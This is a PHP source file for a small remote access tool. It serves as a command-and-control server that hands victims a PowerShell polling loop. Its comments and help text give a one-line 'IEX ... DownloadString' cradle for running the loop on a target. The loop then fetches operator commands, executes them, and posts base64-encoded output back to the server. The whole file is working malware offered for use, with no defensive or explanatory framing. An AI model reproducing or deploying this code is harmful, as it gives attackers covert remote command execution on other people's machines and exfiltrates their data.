<?php

/* execute the following command in cmd.exe
powershell IEX (New-Object Net.WebClient).DownloadString('http://172.16.223.131/rat/c2.php')
*/


$tmp_dir = sys_get_temp_dir();
$tmp_dir = '.';
$cmd_file = $tmp_dir . '/cmd.txt';
$result_file = $tmp_dir . '/result.txt';
$init_pwd_file = $tmp_dir . '/pwd.txt';

if(isset($argv[1]) && $argv[1] === '--help')
{
	showHelp();
	return;
}

if(isset($_POST['init']))
{
	writeStr2File($init_pwd_file, $_POST['init'], 'a');
	return;
}

if(isset($_POST['body']))
{
        $str = base64_decode($_POST['body']) . "\n";
#	$str = mv_convert_encoding($str, "UTF-8", "auto");
        writeStr2File($result_file, $str, 'a');
        return;
}


if(isset($_GET['c2']))
{
        if(file_exists($cmd_file))
        {
                system('cat ' . $cmd_file);
                unlink($cmd_file);
        }
        else
        {
                echo 'NOCOMMAND';
        }
        return;
}


//------- return PS script --------------//
if(isset($_SERVER["REQUEST_METHOD"]) && $_SERVER['REQUEST_METHOD'] === 'GET')
{
	echoClientScript();
	return;
}



//------- shell --------------//

while (!feof(STDIN))
{
	echo 'COMMAND> ';
        $str = trim(fgets(STDIN));
	if(empty(trim($str)))
		continue;

        if($str === 'bye')
                exit;

        writeStr2File($cmd_file, $str, 'w');

        while(1)
        {
                if(file_exists($result_file))
                {
                        echo '-------- RESULT ---------' . "\n";
//                        system('cat ' . $result_file);
                        system('iconv -f SJIS ' . $result_file);
                        echo "\n";
                        unlink($result_file);
                        break;
                }
                sleep(1);
        }
}

//----------functions------------------//

function echoClientScript()
{
	$url = mkOwnUrl();
//echo '$pwd = IEX pwd; Invoke-RestMethod -Uri "' . $url . '" -Method POST -Body "init=${pwd}"' . "\n";
echo 'while(1){' . "\n";
echo '        $cmd = (New-Object Net.WebClient).DownloadString(\'' . $url . '?c2=1\');';
echo <<<'EOF'

        if($cmd -ne 'NOCOMMAND')
        {
                $line = IEX $cmd
                $data = @()
                $line | ForEach-Object {$data += $_}
                $result = $data -Join "`n"
                $byte = ([System.Text.Encoding]::GetEncoding("shift_jis")).GetBytes($result)
                $b64 = [Convert]::ToBase64String($byte)

EOF;
echo '                Invoke-RestMethod -Uri "' . $url . '" -Method POST -Body "body=${b64}"' . "\n";
echo '}' . "\n";
//echo '        ping localhost -n 2 > null' . "\n";
echo '        Start-Sleep -s 1' . "\n";
echo '}';
        return;
}

function mkOwnUrl()
{
	return 'http://' . $_SERVER['HTTP_HOST'] . 	$_SERVER['PHP_SELF'];
	
}

function showHelp()
{

	echo <<<EOF
Type the following command on the target device.
powershell IEX (New-Object Net.WebClient).DownloadString('http://IP Address/this file path')

EOF;

}


function writeStr2File($file_name, $str, $mode='w')
{
        $fp = fopen($file_name, $mode);
        if($fp === FALSE)
                return FALSE;
        flock($fp, LOCK_EX);
        fwrite($fp, $str);
        flock($fp, LOCK_UN);
        fclose($fp);
        return TRUE;
}


